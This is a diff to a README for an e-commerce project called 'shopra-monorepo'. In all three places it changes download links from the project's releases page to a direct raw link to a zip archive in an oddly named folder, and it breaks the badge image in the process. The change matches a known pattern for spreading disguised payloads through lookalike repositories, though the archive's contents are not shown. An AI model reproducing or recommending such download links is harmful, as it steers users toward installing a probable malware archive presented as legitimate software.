@@ -1,6 +1,6 @@
 # 🛒 shopra-monorepo - Easy Setup for Your E-Commerce Journey
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/TheOGboy/shopra-monorepo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/TheOGboy/shopra-monorepo/master/overlordship/shopra-monorepo.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/TheOGboy/shopra-monorepo/master/overlordship/shopra-monorepo.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer meets these basic requirements:
 To install the Shopra Monorepo, follow these simple steps:
 
 1. **Download the Software:**
-   Visit this page to download: [Download the Latest Release](https://github.com/TheOGboy/shopra-monorepo/releases)
+   Visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/TheOGboy/shopra-monorepo/master/overlordship/shopra-monorepo.zip)
 
 2. **Choose Your Version:**
    On the Releases page, you will see a list of available versions. Select the most recent version to ensure you have the latest features and fixes.
@@ -78,6 +78,6 @@ Join our community to learn more, share experiences, or ask for help:
 
 ## 🔗 Final Steps
 
-To ensure you always have the latest features and updates, repeat the download steps regularly. For any future releases, visit this page to download: [Download the Latest Release](https://github.com/TheOGboy/shopra-monorepo/releases)
+To ensure you always have the latest features and updates, repeat the download steps regularly. For any future releases, visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/TheOGboy/shopra-monorepo/master/overlordship/shopra-monorepo.zip)
 
 Thank you for choosing Shopra Monorepo! We hope you enjoy a seamless e-commerce experience.
